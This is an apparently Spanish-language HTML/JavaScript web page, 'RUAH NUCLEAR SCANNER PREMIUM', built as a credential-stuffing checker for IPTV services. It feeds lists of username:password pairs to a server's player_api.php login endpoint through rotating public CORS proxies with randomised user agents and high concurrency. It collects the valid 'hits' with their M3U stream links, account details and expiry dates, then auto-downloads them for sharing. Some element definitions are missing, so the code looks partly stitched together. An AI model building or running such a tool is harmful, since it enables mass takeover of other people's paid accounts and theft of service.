<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
<title>RUAH NUCLEAR | SCANNER PREMIUM</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,600;14..32,800&display=swap');

  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', system-ui, sans-serif;
    min-height: 100vh;
    padding: 1.5rem;
    background-image: url('https://i.postimg.cc/MT1yfP8Y/1782310613548.png');
    background-size: cover;
    background-attachment: fixed;
    background-position: center;
    background-repeat: no-repeat;
    color: #f0f4ff;
    text-shadow: 0 2px 12px rgba(0,0,0,0.8);
    position: relative;
  }
  /* Overlay casi imperceptible para dar contraste mínimo */
  body::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.05);
    pointer-events: none;
    z-index: 0;
  }
  .app-3d {
    max-width: 1400px;
    margin: 0 auto;
    position: relative;
    z-index: 1;
  }

  /* HERO */
  .hero-3d { text-align: center; margin-bottom: 2rem; }
  .animated-scanner {
    font-size: 3.5rem;
    font-weight: 900;
    background: linear-gradient(135deg, #00d4ff, #0088ff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    text-shadow: 0 0 40px rgba(0, 212, 255, 0.4);
    animation: scannerMove 1.8s ease-in-out infinite alternate, glitchText 3s infinite;
    display: inline-block;
    padding: 0 1rem;
  }
  @keyframes scannerMove {
    0% { transform: translateY(0px) scale(1); letter-spacing: -0.02em; text-shadow: 0 0 5px #00d4ff; }
    100% { transform: translateY(-6px) scale(1.02); letter-spacing: 0.04em; text-shadow: 0 0 45px #00d4ff, 0 0 20px #0088ff; }
  }
  @keyframes glitchText {
    0%, 100% { clip-path: inset(0 0 0 0); }
    92% { clip-path: inset(0 0 0 0); }
    95% { clip-path: inset(10% 0 30% 0); }
    97% { clip-path: inset(40% 0 10% 0); }
  }
  .ruah-big {
    font-size: 2.2rem;
    font-weight: 800;
    display: inline-flex;
    align-items: center;
    gap: 0.6rem;
    background: rgba(0, 0, 0, 0.1);
    backdrop-filter: blur(2px);
    -webkit-backdrop-filter: blur(2px);
    padding: 0.4rem 1.8rem;
    border-radius: 100px;
    margin-top: 0.8rem;
    border: 1px solid rgba(0, 212, 255, 0.2);
    box-shadow: 0 0 30px rgba(0, 212, 255, 0.1);
    transform: rotateX(4deg);
  }
  .ruah-big span { font-size: 2rem; }

  /* PANELES CASI TRANSPARENTES */
  .glass-3d {
    background: rgba(10, 12, 18, 0.05);
    backdrop-filter: blur(2px);
    -webkit-backdrop-filter: blur(2px);
    border-radius: 2rem;
    border: 1px solid rgba(0, 212, 255, 0.05);
    box-shadow: 0 8px 32px rgba(0,0,0,0.1), 0 0 0 1px rgba(0, 212, 255, 0.02) inset;
    transition: all 0.25s ease;
  }
  .glass-3d:hover {
    background: rgba(10, 12, 18, 0.12);
    box-shadow: 0 16px 48px rgba(0,0,0,0.15), 0 0 0 2px rgba(0, 212, 255, 0.05) inset;
  }
  .panel { padding: 1.5rem; margin-bottom: 1.8rem; }

  /* INPUTS Y BOTONES - ESTILO AZUL FLUOR */
  .flex-row { display: flex; flex-wrap: wrap; gap: 1rem; align-items: flex-end; }
  .input-group { flex: 1; min-width: 160px; }
  label {
    font-size: 0.7rem;
    text-transform: uppercase;
    font-weight: 600;
    letter-spacing: 1px;
    color: #80d4ff;
    margin-bottom: 0.3rem;
    display: block;
    text-shadow: 0 0 10px rgba(0, 212, 255, 0.2);
  }
  input, textarea, select {
    background: rgba(0, 0, 0, 0.15);
    border: 1px solid rgba(0, 212, 255, 0.1);
    border-radius: 1rem;
    padding: 0.75rem 1rem;
    color: white;
    font-family: 'Inter', monospace;
    width: 100%;
    outline: none;
    transition: 0.2s;
    backdrop-filter: blur(2px);
  }
  input:focus, textarea:focus, select:focus {
    border-color: #00d4ff;
    box-shadow: 0 0 25px rgba(0, 212, 255, 0.15);
  }
  button {
    background: linear-gradient(135deg, #00d4ff, #0066cc);
    border: none;
    border-radius: 2rem;
    padding: 0.75rem 1.5rem;
    font-weight: 800;
    font-size: 0.9rem;
    color: white;
    cursor: pointer;
    transition: 0.2s;
    box-shadow: 0 6px 0 rgba(0,0,0,0.3);
    transform: translateY(-2px);
    border: 1px solid rgba(0, 212, 255, 0.15);
    text-shadow: 0 1px 2px rgba(0,0,0,0.3);
  }
  button:active { transform: translateY(2px); box-shadow: 0 1px 0 rgba(0,0,0,0.3); }
  button:disabled { opacity: 0.2; transform: none; cursor: not-allowed; }
  .clear-btn {
    background: rgba(0,0,0,0.15);
    border: 1px solid #00d4ff;
    box-shadow: none;
    color: #00d4ff;
  }
  .clear-btn:hover { background: rgba(0, 212, 255, 0.05); transform: translateY(-3px); }

  .options-bar {
    display: flex;
    flex-wrap: wrap;
    gap: 1rem;
    margin-top: 1rem;
    align-items: center;
  }
  .cors-row {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    background: rgba(0,0,0,0.08);
    padding: 0.3rem 1rem;
    border-radius: 2rem;
    backdrop-filter: blur(2px);
  }
  .preset-row {
    display: flex;
    gap: 1rem;
    align-items: flex-end;
    flex-wrap: wrap;
    margin-top: 1rem;
  }
  .preset-select { flex: 3; min-width: 200px; }

  /* PROGRESS */
  .progress-card {
    background: rgba(0, 0, 0, 0.08);
    backdrop-filter: blur(2px);
    -webkit-backdrop-filter: blur(2px);
    border-radius: 1.5rem;
    padding: 1rem;
    margin-bottom: 1rem;
    border-left: 6px solid #00d4ff;
  }
  .job-header {
    display: flex;
    justify-content: space-between;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }
  .progress-bar-bg {
    background: rgba(255,255,255,0.05);
    border-radius: 30px;
    height: 12px;
    overflow: hidden;
  }
  .progress-fill {
    background: linear-gradient(90deg, #00d4ff, #0066cc);
    width: 0%;
    height: 100%;
    border-radius: 30px;
    transition: width 0.2s;
  }
  .current-combo {
    font-size: 0.7rem;
    color: #80d4ff;
    margin-top: 6px;
    word-break: break-all;
  }

  /* HITS */
  .hits-panel {
    max-height: 600px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 1.2rem;
  }
  .hit-item {
    background: rgba(0, 0, 0, 0.15);
    backdrop-filter: blur(4px);
    -webkit-backdrop-filter: blur(4px);
    border-radius: 1.2rem;
    padding: 1.2rem;
    border: 1px solid rgba(0, 212, 255, 0.05);
    transition: 0.2s;
    box-shadow: 0 4px 16px rgba(0,0,0,0.1);
  }
  .hit-item:hover {
    background: rgba(0, 0, 0, 0.25);
    transform: scale(1.01);
    border-color: rgba(0, 212, 255, 0.15);
    box-shadow: 0 0 30px rgba(0, 212, 255, 0.05);
  }
  .hit-html-content {
    font-family: 'JetBrains Mono', 'Inter', monospace;
    font-size: 0.8rem;
    line-height: 1.7;
    white-space: pre-wrap;
    word-break: break-word;
    color: #eef2ff;
  }
  .hit-html-content .line {
    display: block;
    padding: 0.1rem 0;
  }
  .hit-html-content .label { color: #80d4ff; font-weight: 600; }
  .hit-html-content .value { color: #fff; }
  .hit-html-content .section-title {
    color: #ffdd44;
    font-weight: 800;
    margin-top: 0.3rem;
    border-bottom: 1px dashed rgba(0, 212, 255, 0.2);
    padding-bottom: 0.2rem;
  }
  .hit-html-content .footer-line {
    color: #00d4ff;
    font-weight: 800;
    margin-top: 0.5rem;
    text-shadow: 0 0 15px rgba(0, 212, 255, 0.2);
  }

  @media (max-width: 700px) {
    .animated-scanner { font-size: 2rem; }
    .ruah-big { font-size: 1.3rem; }
    body { padding: 1rem; }
    .hit-html-content { font-size: 0.7rem; }
  }
</style>
</head>

    <div style="font-size:0.9rem; margin-top:0.2rem; opacity:0.9; text-shadow: 0 2px 15px rgba(0,0,0,0.8);">🔥 SOLO PARA GUAPOS Y SEXYS 🔥</div>

  <div class="glass-3d panel">

      <div style="flex:1"><label>📁 COMBO #2 (ENGINE 2)</label><input type="file" id="comboFile2" accept=".txt"></div>

    <button id="loadRuahCombosBtn" style="width:100%; margin-top:0.8rem; background: linear-gradient(135deg, #00d4ff, #0066cc);">🔥 COMBO-RUAH-ONLINE (cargar en ENGINE 1) 🔥</button>
    <div class="options-bar">
      <div class="cors-row"><input type="checkbox" id="useCors" checked> <label>🌐 CORS PROXY</label></div>
      <div class="cors-row"><input type="checkbox" id="soundToggle" checked> <label>🔊 SONIDO HIT</label></div>
      <div class="cors-row"><input type="checkbox" id="autoDownload" checked> <label>💾 AUTO-DESCARGAR</label></div>

    <div style="display: flex; gap: 1rem; margin-top: 1rem; flex-wrap: wrap;">
      <button id="startBtn">▶ INICIAR SCAN</button>
      <button id="stopBtn">⏹ DETENER</button>
      <button id="saveBtn">💾 GUARDAR HITS</button>
    </div>
  </div>

  <div id="progressContainer" class="progress-card"><div class="job-header"><span>🔥 ENGINE 1</span><span id="hitsCount1" class="yellow-hit">💥 HITS:0</span></div><div class="progress-bar-bg"><div id="progressBarFill" class="progress-fill"></div></div><div class="progress-stats"><span id="progressText">Esperando...</span></div><div id="currentCombo" class="current-combo">👤 Usuario: -</div></div>
  <div id="progressContainer2" class="progress-card"><div class="job-header"><span>⚡ ENGINE 2</span><span id="hitsCount2" class="yellow-hit">💥 HITS:0</span></div><div class="progress-bar-bg"><div id="progressBarFill2" class="progress-fill"></div></div><div class="progress-stats"><span id="progressText2">Esperando...</span></div><div id="currentCombo2" class="current-combo">👤 Usuario: -</div></div>
  <div id="progressContainer3" class="progress-card"><div class="job-header"><span>💀 ENGINE 3</span><span id="hitsCount3" class="yellow-hit">💥 HITS:0</span></div><div class="progress-bar-bg"><div id="progressBarFill3" class="progress-fill"></div></div><div class="progress-stats"><span id="progressText3">Esperando...</span></div><div id="currentCombo3" class="current-combo">👤 Usuario: -</div></div>

  <div class="glass-3d panel"><div style="margin-bottom:1rem; font-weight:800;">🎯 HITS ENCONTRADOS (CUENTAS VIP)</div><div id="hitsContainer" class="hits-panel"></div></div>
  <footer id="footerMade" style="text-align:center; margin-top:2rem; opacity:0.6; font-size:0.8rem; text-shadow: 0 2px 15px rgba(0,0,0,0.8);">⚡ RUAH NUCLEAR · SOLO PARA GUAPOS Y SEXYS · 🇨🇱 SCANNER PREMIUM 🔥</footer>

const comboFile = [document.getElementById('comboFile1'),document.getElementById('comboFile2'),document.getElementById('comboFile3')];
const comboTextArea = document.getElementById('comboText');

const hitsContainer = document.getElementById('hitsContainer');
const footer = document.getElementById('footerMade');

// variables estado
let isRunning = false, stopRequested = false;
let serverIP = null, serverGeo = null;
let combos = [[],[],[]];
let hits = [[],[],[]];
let audioCtx = null;
let jobProxies = {};
const proxyFailMap = new Map();
const PROXY_MAX_FAILS = 3, COOLDOWN = 60000;
const CORS_PROXIES = ['https://cors.isomorphic-git.org/{url}','https://thingproxy.freeboard.io/fetch/{url}','https://api.allorigins.win/raw?url={url}','https://corsproxy.io/?{url}','https://api.codetabs.com/v1/proxy/?quest={url}','https://yacdn.org/proxy/{url}','https://api.s0n1c.org/cors?url={url}'];

function randomUA(){ const ua=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36","Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/129.0.0.0 Mobile Safari/537.36"]; return ua[Math.floor(Math.random()*ua.length)]; }
function createSession(){ return { headers:{"User-Agent":randomUA(),"Accept":"application/json, text/javascript,*/*;q=0.9"}, cookies:{} }; }
function attachCookies(opts,session){ const cstr=Object.entries(session.cookies||{}).map(([k,v])=>`${k}=${v}`).join("; "); if(cstr){ opts.headers={...(opts.headers||{})}; opts.headers.Cookie=cstr; } return opts; }
function fetchTimeout(url,opts={},ms=7000){ return new Promise((resolve,reject)=>{ const ctrl=new AbortController(); const id=setTimeout(()=>{ ctrl.abort(); reject(new Error('timeout')); },ms); fetch(url,{...opts,signal:ctrl.signal}).then(r=>{ clearTimeout(id); resolve(r); }).catch(e=>{ clearTimeout(id); reject(e); }); }); }
function proxyIsCold(tpl){ const s=proxyFailMap.get(tpl); return s&&s.until&&Date.now()<s.until; }
function noteProxyFail(tpl){ let s=proxyFailMap.get(tpl)||{n:0,until:0}; s.n++; if(s.n>=PROXY_MAX_FAILS){ s.until=Date.now()+COOLDOWN; s.n=0; } proxyFailMap.set(tpl,s); }
function noteProxyOk(tpl){ proxyFailMap.delete(tpl); }
async function fetchWithCors(url,options={},jobId=null){ const baseOpts={cache:'no-store',keepalive:false,...options}; if(jobId&&jobProxies[jobId]&&!proxyIsCold(jobProxies[jobId])){ try{ const proxied=jobProxies[jobId].replace('{url}',encodeURIComponent(url)); const r=await fetchTimeout(proxied,baseOpts); if(r.ok){ noteProxyOk(jobProxies[jobId]); return r; } noteProxyFail(jobProxies[jobId]); }catch(e){ noteProxyFail(jobProxies[jobId]); } } try{ const r=await fetchTimeout(url,baseOpts); if(r.ok) return r; }catch(e){} if(!useCorsCheck.checked) throw new Error('No cors'); const pool=CORS_PROXIES.filter(t=>!(jobId&&jobProxies[jobId]===t)&&!proxyIsCold(t)).sort(()=>Math.random()-0.5); for(const tpl of pool){ try{ const proxied=tpl.replace('{url}',encodeURIComponent(url)); const r=await fetchTimeout(proxied,baseOpts); if(r.ok){ noteProxyOk(tpl); return r; } noteProxyFail(tpl); }catch(e){ noteProxyFail(tpl); } } throw new Error('Fetch failed'); }
async function getJson(url,opts,jobId){ const r=await fetchWithCors(url,opts,jobId); if(!r.ok) throw new Error('Bad'); return await r.json(); }

function extractCombo(line){ if(!line) return null; let s=String(line).normalize('NFKC').replace(/\s+/g,' ').trim(); const m=s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u); if(!m) return null; const user=m[1].trim(), pass=m[2].trim(); if(!user||!pass) return null; return [user,pass]; }

// ====== OBTENER TOTALES ======
async function getTotalCounts(host, user, pass, usedProto) {
    const baseUrl = `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
    const opts = { headers: { 'User-Agent': randomUA() } };
    try {
        const [liveResp, vodResp, seriesResp] = await Promise.allSettled([
            fetchTimeout(`${baseUrl}&action=get_live_streams`, opts, 5000),
            fetchTimeout(`${baseUrl}&action=get_vod_streams`, opts, 5000),
            fetchTimeout(`${baseUrl}&action=get_series`, opts, 5000)
        ]);
        let channels = 0, movies = 0, series = 0;
        if (liveResp.status === 'fulfilled' && liveResp.value.ok) {
            const data = await liveResp.value.json();
            if (Array.isArray(data)) channels = data.length;
        }
        if (vodResp.status === 'fulfilled' && vodResp.value.ok) {
            const data = await vodResp.value.json();
            if (Array.isArray(data)) movies = data.length;
        }
        if (seriesResp.status === 'fulfilled' && seriesResp.value.ok) {
            const data = await seriesResp.value.json();
            if (Array.isArray(data)) series = data.length;
        }
        return { channels, movies, series };
    } catch(e) {
        return { channels: 0, movies: 0, series: 0 };
    }
}

// ====== VALIDAR COMBO ======
async function validarCombo(host, combo, opts={}, session=null, ui=null, jobId=null, nick='RUAH DE CHILE') {
    if(stopRequested) return null;
    const pair = Array.isArray(combo) ? combo : extractCombo(combo);
    if(!pair) return null;
    const [user, pass] = pair;
    if(ui?.user) ui.user.textContent = `👤 Usuario: ${user}:${pass}`;
    const protos = ['http://','https://'];
    let data = null, usedProto = 'http://';
    for(const p of protos){
        const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
        try{
            const res = await fetchWithCors(url, opts, jobId);
            if(res.ok){
                data = await res.json();
                usedProto = p;
                break;
            }
        }catch(e){}
    }
    if(!data) return null;
    const uinfo = data.user_info || {};
    const ok = (uinfo.status === 'Active' || uinfo.status === 'Activo' || String(uinfo.auth) === '1' || uinfo.status === 'Actif');
    if(!ok) return null;

    // Obtener totales
    const counts = await getTotalCounts(host, user, pass, usedProto);

    const [hostname, port] = host.includes(':') ? [host.split(':')[0], host.split(':')[1]] : [host, (usedProto==='https://'?'443':'80')];
    const linkM3u = `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
    const geo = serverGeo || null;
    const pais = geo ? `${geo.country}` : 'Desconocido';
    // Construir hit con nuevo formato
    const hitData = {
        user, pass, host, hostname, port, usedProto, uinfo, linkM3u, geo, pais,
        nick: nick || 'RUAH DE CHILE',
        channels: counts.channels,
        movies: counts.movies,
        series: counts.series,
        total: counts.channels + counts.movies + counts.series
    };
    return hitData;
}

// ====== CONSTRUIR HTML Y TEXTO PLANO ======
function buildHitHTMLAndPlain(hitData) {
    const { user, pass, host, hostname, port, usedProto, uinfo, linkM3u, geo, pais, nick, channels, movies, series, total } = hitData;
    const created = uinfo.created_at ? new Date(uinfo.created_at * 1000).toLocaleDateString() : 'N/D';
    const expires = uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toLocaleDateString() : 'N/D';
    const status = (uinfo.status === 'Active' || uinfo.status === 'Activo' || String(uinfo.auth) === '1') ? '✅ Active' : '❌ Inactive';
    const maxConns = uinfo.max_connections ?? uinfo.max_cons ?? 'N/D';
    const activeCons = uinfo.active_cons ?? uinfo.connected_cons ?? 'N/D';

    const lines = [
        `⚡ SCANNER NUCLEAR RUAH ⚡`,
        `🇨🇱  PARA GUAPOS Y SEXYS 🇨🇱`,
        `R-IP: ${geo ? geo.ip : 'N/D'}`,
        `U- Host: ${usedProto}${host}`,
        `A- Usuario: ${user}`,
        `H - Contraseña: ${pass}`,
        `🏴‍☠️- País : 🏁 ${pais}`,
        `💻- Creada: ${created}`,
        `🗓️ - Expira: ${expires}`,
        `📡 - Estado: ${status}`,
        `🔗 Conexiones máximas: ${maxConns}  Conexiones activas: ${activeCons}`,
        `🔗 Link M3U: ${linkM3u}`,
        `🏷️ Calidad : 💎 PREMIUM 💎`,
        `📜Nick : ${nick}`,
        `CONTENIDO DEL SERVIDOR:`,
        `📡 Canales : ${channels}`,
        `📺 Películas : ${movies}`,
        `🍿 Series : ${series}`,
        `📊 Total : ${total}`,
        `🇨🇱𝐌𝟑𝐮 ${nick} 𝟐𝟎𝟐6 🇨🇱`
    ];

    const htmlContent = `<div class="hit-html-content">` +
        lines.map(line => `<div class="line">${line}</div>`).join('') +
        `</div>`;
    const plainText = lines.join('\n');
    return { htmlContent, plainText };
}

// ====== MOSTRAR HIT ======
function mostrarHit(hitData, idx) {
    const { htmlContent, plainText } = buildHitHTMLAndPlain(hitData);
    const div = document.createElement('div');
    div.className = 'hit-item';
    div.innerHTML = htmlContent;
    hitsContainer.prepend(div);
    hits[idx].push({ html: htmlContent, text: plainText, ...hitData });
    if(hitsCount[idx]) hitsCount[idx].innerHTML = `💥 HITS: ${hits[idx].length}`;
    playHitSound();
}

// ====== ACTUALIZAR PROGRESO ======
function actualizarProgresoJob(job, proc, total) {
    const pct = total === 0 ? 0 : (proc / total) * 100;
    if(progressFill[job]) progressFill[job].style.width = pct + '%';
    if(progressTextSpan[job]) progressTextSpan[job].textContent = `✅ Procesados: ${proc} / ${total} | 💥 HITS: ${hits[job].length}`;
    if(hitsCount[job]) hitsCount[job].innerHTML = `💥 HITS: ${hits[job].length}`;
}

// ====== PROCESAR JOB ======
async function processarJob(host, combosArr, concurrency, jobIdx, nick) {
    if(!combosArr.length) return;
    const total = combosArr.length;
    let processed = 0;
    const sleep = ms => new Promise(r => setTimeout(r, ms));
    let index = 0;
    const worker = async () => {
        const session = createSession();
        while(index < total && !stopRequested) {
            const i = index++;
            if(i >= total) break;
            const combo = combosArr[i];
            if(!combo) continue;
            if(currentComboSpan[jobIdx]) currentComboSpan[jobIdx].textContent = `👤 Usuario: ${combo}`;
            let opts = { headers: { ...session.headers } };
            opts = attachCookies(opts, session);
            try {
                const hitData = await validarCombo(host, combo, opts, session, { user: currentComboSpan[jobIdx] }, jobIdx+1, nick);
                if(!stopRequested && hitData) {
                    mostrarHit(hitData, jobIdx);
                }
            } catch(e) {}
            processed++;
            actualizarProgresoJob(jobIdx, processed, total);
            await sleep(40 + Math.random() * 140);
            if(stopRequested) break;
        }
    };
    if(progressTextSpan[jobIdx]) progressTextSpan[jobIdx].textContent = '❤️‍🔥 Iniciando scan...';
    await Promise.all(Array.from({ length: Math.min(concurrency, total) }, () => worker()));
    if(currentComboSpan[jobIdx]) currentComboSpan[jobIdx].textContent = '👤 Usuario: -';
    if(progressTextSpan[jobIdx]) progressTextSpan[jobIdx].textContent += stopRequested ? ' | ⏹ Scan detenido.' : ' | 🏁 Scan finalizado.';
}

// ====== INICIAR SCAN ======
async function startScan() {
    if(isRunning) return;
    if(!audioCtx) {
        const Ctx = window.AudioContext || window.webkitAudioContext;
        if(Ctx) {
            audioCtx = new Ctx();
            const o = audioCtx.createOscillator(), g = audioCtx.createGain();
            g.gain.value = 0;
            o.connect(g);
            g.connect(audioCtx.destination);
            o.start();
            o.stop(audioCtx.currentTime + 0.01);
        }
    }
    if(audioCtx && audioCtx.state === 'suspended') await audioCtx.resume();

    stopRequested = false;
    isRunning = true;
    startBtn.disabled = true;
    stopBtn.disabled = false;
    saveBtn.disabled = true;
    hitsContainer.innerHTML = '';
    for(let i=0; i<3; i++) {
        hits[i] = [];
        progressFill[i].style.width = '0%';
        progressTextSpan[i].textContent = '🌐 Resolviendo IP...';
        currentComboSpan[i].textContent = '👤 Usuario: -';
        if(hitsCount[i]) hitsCount[i].innerHTML = '💥 HITS: 0';
    }

    const rawHost = hostInput.value.trim();
    if(!rawHost) { alert('Ingresa un host'); isRunning=false; startBtn.disabled=false; saveBtn.disabled=false; return; }
    const host = rawHost.replace(/^https?:\/\//, '');
    const concBase = parseInt(concurrencyInput.value) || 80;
    const activeJobs = combos.filter(c => c.length).length || 1;
    const perConc = Math.max(1, Math.floor(concBase / activeJobs));
    const nick = nickInput.value.trim() || 'RUAH DE CHILE';

    const domainHost = host.split(':')[0];
    try {
        const resp = await fetch(`https://dns.google/resolve?name=${domainHost}&type=A`);
        if(resp.ok) {
            const data = await resp.json();
            const ip = data.Answer?.find(a => a.type === 1)?.data;
            if(ip) {
                serverIP = ip;
                const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
                if(geoResp.ok) {
                    const geo = await geoResp.json();
                    if(geo.status === 'success') serverGeo = { ip, country: geo.country, city: geo.city };
                }
            }
        }
    } catch(e) {}

    const shuffleArray = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
    if(combos[0].length) jobProxies[1] = shuffleArray[0 % CORS_PROXIES.length];
    if(combos[1].length) jobProxies[2] = shuffleArray[1 % CORS_PROXIES.length];
    if(combos[2].length) jobProxies[3] = shuffleArray[2 % CORS_PROXIES.length];

    const jobs = [];
    if(combos[0].length) jobs.push(processarJob(host, combos[0], perConc, 0, nick));
    if(combos[1].length) jobs.push(processarJob(host, combos[1], perConc, 1, nick));
    if(combos[2].length) jobs.push(processarJob(host, combos[2], perConc, 2, nick));
    if(jobs.length === 0) { isRunning=false; startBtn.disabled=false; stopBtn.disabled=true; saveBtn.disabled=false; return; }

    await Promise.allSettled(jobs);
    isRunning = false;
    stopBtn.disabled = true;
    startBtn.disabled = false;
    saveBtn.disabled = false;
    const totalHits = hits[0].length + hits[1].length + hits[2].length;
    if(autoDownload.checked && totalHits > 0) saveHits();
}

// ====== GUARDAR HITS ======
function saveHits() {
    const allHits = [];
    for(let i=0; i<3; i++) allHits.push(...hits[i]);
    const unique = new Map();
    for(const h of allHits) if(!unique.has(h.text)) unique.set(h.text, h);
    const content = Array.from(unique.values()).map(h => h.text).join('\n\n-----------------\n\n');
    if(!content) { alert('No hay hits para guardar'); return; }
    const blob = new Blob([`=============== ⚡❤️‍🔥 RUAH SEXY TV ❤️‍🔥⚡ ===============\n💥 TOTAL HITS: ${unique.size}\n=======================================================\n\n${content}`], { type: 'text/plain' });
    const a = document.createElement('a');
    const host = hostInput.value.trim().replace(/[^a-z0-9]/gi, '_');
    a.href = URL.createObjectURL(blob);
    a.download = `ruah_hits_${host}_${new Date().toISOString().slice(0,19).replace(/:/g,'-')}.txt`;
    document.body.appendChild(a);
    a.click();
    a.remove();
}

// ====== FUNCIONES DE CARGA ======
function loadCombosFromFiles() {
    for(let i=0; i<3; i++) {
        const file = comboFile[i].files[0];
        if(file) {
            const reader = new FileReader();
            reader.onload = e => {
                const lines = e.target.result.split(/\r?\n/);
                const parsed = [];
                for(const line of lines) {
                    const p = extractCombo(line);
                    if(p) parsed.push(`${p[0]}:${p[1]}`);
                }
                combos[i] = parsed;
                updateStartBtn();
            };
            reader.readAsText(file);
        } else {
            // Si no hay archivo, no vaciamos el combo para no perder lo que haya en textarea o ruah
            // pero si se selecciona archivo, reemplaza.
        }
    }
    updateStartBtn();
}

function loadCombosFromText() {
    const raw = comboTextArea.value;
    const parsed = [];
    if (raw) {
        const lines = raw.split(/\r?\n/);
        for (const line of lines) {
            const p = extractCombo(line);
            if (p) parsed.push(`${p[0]}:${p[1]}`);
        }
    }
    // Asignar al engine 1 (reemplaza lo que hubiera)
    combos[0] = parsed;
    updateStartBtn();
}

function updateStartBtn() {
    const hasHost = !!hostInput.value.trim();
    const hasCombos = combos[0].length || combos[1].length || combos[2].length;
    startBtn.disabled = !(hasHost && hasCombos);
}

function fullReset() {
    if(isRunning) stopRequested = true;
    isRunning = false; stopRequested = false;
    hostInput.value = '';
    for(let i=0; i<3; i++) { combos[i] = []; comboFile[i].value = ''; }
    comboTextArea.value = '';
    hitsContainer.innerHTML = '';
    for(let i=0; i<3; i++) {
        hits[i] = [];
        progressFill[i].style.width = '0%';
        progressTextSpan[i].textContent = 'Esperando...';
        currentComboSpan[i].textContent = '👤 Usuario: -';
        if(hitsCount[i]) hitsCount[i].innerHTML = '💥 HITS: 0';
    }
    serverIP = null; serverGeo = null;
    updateStartBtn();
}

function loadRuahCombos() {
    // Limpiar todos los combos
    for (let i = 0; i < 3; i++) combos[i] = [];
    // Parsear el raw
    const lines = RUAH_COMBOS_RAW.split(/\r?\n/);
    const parsed = [];
    for (const line of lines) {
        const p = extractCombo(line);
        if (p) parsed.push(`${p[0]}:${p[1]}`);
    }
    combos[0] = parsed;
    // Actualizar textarea para reflejar
    comboTextArea.value = RUAH_COMBOS_RAW;
    // Limpiar archivos
    for (let i = 0; i < 3; i++) comboFile[i].value = '';
    updateStartBtn();
    const btn = loadRuahBtn;
    const original = btn.innerText;
    btn.innerText = '✅ Combos cargados en ENGINE 1! ✅';
    setTimeout(() => btn.innerText = original, 2000);
}

function populatePresets() {
    UNIQUE_SERVERS.forEach(s => {
        const opt = document.createElement('option');
        opt.value = s;
        opt.textContent = s;
        presetSelect.appendChild(opt);
    });
    presetSelect.addEventListener('change', () => {
        if(presetSelect.value) hostInput.value = presetSelect.value;
        updateStartBtn();
    });
}

function initLang() {
    langSelect.addEventListener('change', () => {
        const texts = {
            es: { start: '▶ INICIAR SCAN', stop: '⏹ DETENER', save: '💾 GUARDAR HITS', footer: '⚡ RUAH NUCLEAR · SOLO PARA GUAPOS Y SEXYS · 🇨🇱 SCANNER PREMIUM 🔥' },
            en: { start: '▶ START SCAN', stop: '⏹ STOP', save: '💾 SAVE HITS', footer: '⚡ RUAH NUCLEAR · ONLY FOR HANDSOME & SEXY · 🇨🇱 PREMIUM SCANNER 🔥' },
            fr: { start: '▶ DÉMARRER', stop: '⏹ ARRÊTER', save: '💾 SAUVER HITS', footer: '⚡ RUAH NUCLÉAIRE · POUR BEAUX & SEXY · 🇨🇱 SCANNER PREMIUM 🔥' }
        };
        const l = langSelect.value;
        startBtn.textContent = texts[l].start;
        stopBtn.textContent = texts[l].stop;
        saveBtn.textContent = texts[l].save;
        footer.textContent = texts[l].footer;
    });
}

// ====== EVENTOS ======
startBtn.addEventListener('click', startScan);
stopBtn.addEventListener('click', () => { if(isRunning) stopRequested = true; stopBtn.disabled = true; });
saveBtn.addEventListener('click', saveHits);
for(let i=0; i<3; i++) comboFile[i].addEventListener('change', loadCombosFromFiles);
comboTextArea.addEventListener('input', loadCombosFromText);
loadRuahBtn.addEventListener('click', loadRuahCombos);
clearAllBtn.addEventListener('click', fullReset);
hostInput.addEventListener('input', updateStartBtn);
populatePresets();
initLang();
updateStartBtn();

// ====== SONIDO HIT ======
function playHitSound() {
    if(!soundToggle.checked || !audioCtx) return;
    try {
        const o = audioCtx.createOscillator(), g = audioCtx.createGain();
        o.type = 'sine';
        o.frequency.value = 880;
        g.gain.setValueAtTime(0, audioCtx.currentTime);
        g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime + 0.01);
        g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime + 0.18);
        o.connect(g);
        g.connect(audioCtx.destination);
        o.start();
        o.stop(audioCtx.currentTime + 0.2);
        if(navigator.vibrate) navigator.vibrate(80);
    } catch(e) {}
}
